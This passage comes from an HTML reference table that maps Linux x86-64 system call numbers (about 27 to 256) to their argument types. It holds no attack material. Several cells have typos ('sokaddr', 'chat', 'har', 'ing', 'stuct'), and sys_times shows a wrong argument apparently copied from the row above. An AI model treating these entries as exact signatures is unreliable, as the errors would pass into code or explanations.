*vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>unsigned long start</td><td>size_t len_in</td><td>int behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>key_t key</td><td>size_t size</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>unsigned int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>int which</td><td>struct itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>unsigned int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>int family</td><td>int type</td><td>int protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>int fd</td><td>struct sockaddr *uservaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>int fd</td><td>void *buff</td><td>size_t len</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>int fd</td><td>void *ubuf</td><td>size_t size</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>int fd</td><td>int how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>int fd</td><td>struct sokaddr *umyaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>int fd</td><td>int backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>int family</td><td>int type</td><td>int protocol</td><td>int *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>unsigned long clone_flags</td><td>unsigned long newsp</td><td>void *parent_tid</td><td>void *child_tid</td><td></td><td></td></tr><tr><td>57</td><td>sys_fork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char *const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>pid_t upid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>struct old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>union semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>char *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>key_t key</td><td>int msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>unsigned int fd</td><td>unsigned int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>const char *path</td><td>long length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>unsigned int fd</td><td>unsigned long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>char *buf</td><td>unsigned long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>unsigned int fd</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>int mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>int who</td><td>struct rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>int type</td><td>char *buf</td><td>int len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>pid_t pid</td><td>pid_t pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>uid_t ruid</td><td>uid_t euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>gid_t rgid</td><td>gid_t egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>const stack_t *uss</td><td>stack_t *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>char *filename</td><td>struct utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>unsigned int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>const char *pathname</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>unsigned int fd</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>int which</td><td>int who</td><td>int niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>pid_t pid</td><td>struct timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>int func</td><td>void *ptr</td><td>unsigned long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>const char *new_root</td><td>const char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>struct __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td></td><td>unsigned long arg5</td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>struct task_struct *task</td><td>int code</td><td>unsigned long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>struct timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>const char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>const char *target</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>const char *specialfile</td><td>int swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>const char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>unsigned int level</td><td>struct pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>unsigned long from</td><td>unsigned long num</td><td>int turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>const chat *name_user</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>int fd</td><td>const har *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>int fd</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>int fd</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>pid_t pid</td><td>ing sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>time_t *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>unsigned nr_events</td><td>aio_context_t *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>aio_context_t ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>aio_context_t ctx_id</td><td>long nr</td><td>struct iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>u64 cookie64</td><td>long buf</td><td>long len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>int size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>int *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td>const struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>const clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>timer_t timer_id</td><td>int flags</td><td>const struct itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>timer_t timer_id</td><td>struct itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>const clockid_t which_clock</td><td>const struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>const clockid_t which_clock</td><td>int flags</td><td>const struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>int mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>const char *u_name</td><td>int oflag</td><td>mode_t mode</td><td>struct mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>const char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>mqd_t mqdes</td><td>const char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>mqd_t mqdes</td><td>char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int *u_msg_prio</td><td>const struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>mqd_t mqdes</td><td>const struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>mqd_t mqdes</td><td>const struct mq_attr *u_mqstat</td><td>struct mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>int which</td><td>pid_t upid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>int which</td><td>int who</td><td>int ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>int fd</td><td>const char *pathname</td><td>u32 mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>int fd</td><td>__s32 wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>pid_t pid</td><td>unsigned long 